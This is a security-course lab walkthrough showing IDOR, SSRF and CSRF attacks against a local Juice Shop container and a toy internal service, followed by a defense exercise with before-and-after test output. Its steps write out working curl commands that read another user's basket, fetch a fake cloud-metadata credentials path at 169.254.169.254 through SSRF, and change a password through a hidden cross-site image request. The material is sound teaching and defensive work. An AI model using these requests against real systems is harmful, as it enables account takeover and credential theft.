# Day 9 Lab — Solution / Walkthrough

## Authorized use only

Same notice as [`README.md`](README.md): only run these techniques against
the `juiceshop` and `internal` containers this lab starts, on `cyberlab`, or
your own AWS sandbox in later phases.

## An honest note on what's verified here vs. what to verify yourself

This session's implementation pass validated the lab **statically** only
(`docker compose config -q`, confirmed clean) — it did not run
`docker compose up` against a live Juice Shop and capture real request/
response output, the way Day 4's `SOLUTION.md` did against its own
purpose-built target. Two things follow from that, stated precisely rather
than glossed over:

- **`internal`'s own behavior below IS independently confirmed** — its
  `app.py` was run directly (outside Docker, same code, same logic) during
  this session and every route below (`/`, `/flag`,
  `/latest/meta-data/iam/security-credentials/...`, 404 on anything else)
  returned exactly what's shown.
- **The exact Juice Shop request shapes below (IDOR basket ID, the
  profile-image-by-URL SSRF endpoint, the GET-based change-password CSRF
  quirk) describe Juice Shop's real, documented, upstream challenge design**
  — not behavior this lab invented — but were not re-captured against a
  live container this session. Exact field names/paths can drift slightly
  between Juice Shop versions. **Run the Walkthrough yourself and treat
  Juice Shop's own built-in Score Board (`/#/score-board`) as the
  authoritative "did it actually work" signal** — it flips a challenge to
  solved server-side the moment the real vulnerable condition is met,
  independent of whether you got every path/parameter exactly right by
  memory.

## Step-by-step

### 0. Stage the defense-demo script

```sh
cd cyber_security/labs/day09
mkdir -p ../base/loot/day09
cp authz_ssrf_defense.py ../base/loot/day09/
```

### 1. Recon and confirm the topology

```sh
cd ../base
docker compose exec attacker sh -c "curl -s juiceshop:3000/rest/user/whoami"
```

Expected: a JSON response (empty/anonymous until you register+log in) —
confirms `juiceshop` is reachable, matching the `TARGET_OK` verify check in
`README.md`.

```sh
docker compose exec attacker sh -c "curl -m 3 -s internal/flag; echo EXIT:\$?"
```

Expected: a connection error and non-zero `EXIT:` — `internal` is on
`day09-app` only, not `cyberlab`; `attacker` has no route to it at all. This
confirms the exact gap SSRF is about to close by going through `juiceshop`
instead.

### 2. IDOR — read another user's basket

Register two accounts through Juice Shop's UI or its API
(`POST /api/Users/` with `email`/`password`), log in as the first, and note
the basket ID Juice Shop assigns you (visible in the basket page URL or in
the response of `GET /rest/basket/<id>` for your own basket — Juice Shop
assigns basket IDs sequentially, so a second freshly-created account will
typically have basket ID = yours ± 1, easy to guess without ever needing to
brute-force it):

```sh
docker compose exec attacker sh -c "
TOKEN=\$(curl -s juiceshop:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"user1@cyberlab.test\",\"password\":\"pass12345\"}' | jq -r .authentication.token)
curl -s juiceshop:3000/rest/basket/2 -H \"Authorization: Bearer \$TOKEN\"
"
```

**Expected result (Juice Shop's documented "Basket Access" challenge):**
account 1's token successfully reads basket ID `2` even though it belongs to
account 2 — the endpoint checks "is this caller logged in at all" but never
"does this caller own THIS basket ID." That's broken access control /
IDOR: the object reference (the basket ID) is the only thing standing
between "your data" and "someone else's data," and nothing server-side
verifies ownership before returning it. Confirm via the Score Board: the
"Basket Access" challenge should flip to solved.

### 3. SSRF — reach `internal` (and its fake IMDS path) through `juiceshop`

Log in through the UI, then use Juice Shop's profile-image-by-URL feature
(`PUT /profile/image/url` with a JSON body containing the URL to fetch) to
make `juiceshop` — which IS on `day09-app` — fetch a target `attacker` has
no route to at all:

```sh
docker compose exec attacker sh -c "
TOKEN=\$(curl -s juiceshop:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"user1@cyberlab.test\",\"password\":\"pass12345\"}' | jq -r .authentication.token)
curl -s -X PUT juiceshop:3000/profile/image/url -H \"Authorization: Bearer \$TOKEN\" -H 'Content-Type: application/json' -d '{\"url\":\"http://internal/flag\"}'
curl -s -X PUT juiceshop:3000/profile/image/url -H \"Authorization: Bearer \$TOKEN\" -H 'Content-Type: application/json' -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/cyberlab-day09-role\"}'
"
```

**Expected result:** both requests succeed from `juiceshop`'s point of view
(it just fetches whatever URL it's handed and stores the response as your
profile image, with no check on the destination) — the fetched body (the
toy flag, then the fake credentials JSON) ends up stored as your profile
image content, readable back via your own profile page/image asset. Confirm
via the Score Board: the "SSRF" challenge should flip to solved. This is
the entire SSRF pivot in one sentence: **you never touched `internal`
directly — `juiceshop` did, on your behalf, because you controlled the URL
it was told to fetch.** Drill 2 below, and
[`content/day09-access-ssrf-csrf.md`](../../content/day09-access-ssrf-csrf.md)
Section 1, walk through exactly why the second URL (the fake IMDS path) is
the one that matters most: it's the same technique Day 15 uses against a
real cloud IMDS at the same real address.

### 4. CSRF — silent password change via a cross-site GET

See `README.md`'s "Browser-based steps" for exposing `juiceshop` to your own
browser first. With Juice Shop open and logged in in one tab, open
[`csrf_poc.html`](csrf_poc.html) (edited to point `JUICESHOP_HOST` at
wherever you exposed it) in a second tab.

**Expected result:** the hidden `<img>` tag's cross-site GET against
`/rest/user/change-password?current=&new=csrf-owned123&repeat=csrf-owned123`
fires automatically on page load, carrying whatever Juice Shop session
cookie is already in the browser — no click, no JavaScript needed for that
part, no anti-CSRF token supplied or checked. Confirm by logging out and
attempting to log back in with the OLD password (should fail) and the new
one, `csrf-owned123` (should succeed). This is exactly what Defense 3
(anti-CSRF tokens + `SameSite` cookies) exists to prevent — either control
alone would have broken this: a required token the attacker page can't know,
or a `SameSite=Lax`/`Strict` cookie the browser would then simply not have
attached to a cross-site request at all.

### 5. Defense Lab re-verify (local, no server)

```sh
docker compose exec attacker sh -c "python3 /loot/day09/authz_ssrf_defense.py"
```

**Confirmed output (BEFORE, run directly this session):**

```
=== Defense 1: broken access control / IDOR ===
  can_access_basket(user=42, owner=42, admin=False) -> True  (secure-expected=True)  [PASS]
  can_access_basket(user=42, owner=7, admin=False) -> True  (secure-expected=False)  [FAIL]
  can_access_basket(user=42, owner=7, admin=True) -> True  (secure-expected=True)  [PASS]

=== Defense 2: SSRF allowlist + link-local block ===
  is_allowed_fetch_target('169.254.169.254') -> True  (secure-expected=False)  [FAIL]
  is_allowed_fetch_target('127.0.0.1') -> True  (secure-expected=False)  [FAIL]
  is_allowed_fetch_target('images.example-cdn.test') -> True  (secure-expected=True)  [PASS]
  is_allowed_fetch_target('internal') -> True  (secure-expected=False)  [FAIL]
```

Now edit `authz_ssrf_defense.py`: comment out the two `return True` lines
marked "the entire bug is right here" and uncomment the "AFTER" lines
directly below each (the file's own comments point to exactly which lines).
Re-run:

**Confirmed output (AFTER, run directly this session):**

```
=== Defense 1: broken access control / IDOR ===
  can_access_basket(user=42, owner=42, admin=False) -> True  (secure-expected=True)  [PASS]
  can_access_basket(user=42, owner=7, admin=False) -> False  (secure-expected=False)  [PASS]
  can_access_basket(user=42, owner=7, admin=True) -> True  (secure-expected=True)  [PASS]

=== Defense 2: SSRF allowlist + link-local block ===
  is_allowed_fetch_target('169.254.169.254') -> False  (secure-expected=False)  [PASS]
  is_allowed_fetch_target('127.0.0.1') -> False  (secure-expected=False)  [PASS]
  is_allowed_fetch_target('images.example-cdn.test') -> True  (secure-expected=True)  [PASS]
  is_allowed_fetch_target('internal') -> False  (secure-expected=False)  [PASS]
```

Every line flips to PASS — same input data, only the check's logic changed.
Note Defense 2 uses a strict **allowlist** (`url_host in ALLOWED_HOSTS`),
not a blocklist of private-range prefixes: a blocklist has to be exhaustive
and stay exhaustive forever (miss one representation of an address — a
redirect, a DNS name, decimal/octal IP encoding — and it's bypassed);
default-deny-unless-explicitly-allowed structurally can't be bypassed that
way, which is why it rejects `internal` by its DNS name too, not just by IP.

### `internal`'s routes (confirmed directly, this session, outside Docker)

```
GET /                                                            -> 200, identity banner
GET /flag                                                        -> 200, {"flag": "CTF{ssrf-reached-the-internal-only-service}"}
GET /latest/meta-data/iam/security-credentials/                  -> 200, "cyberlab-day09-role"
GET /latest/meta-data/iam/security-credentials/cyberlab-day09-role -> 200, fake AccessKeyId/SecretAccessKey/Token/Expiration JSON
GET /nope (or any other path)                                    -> 404
```
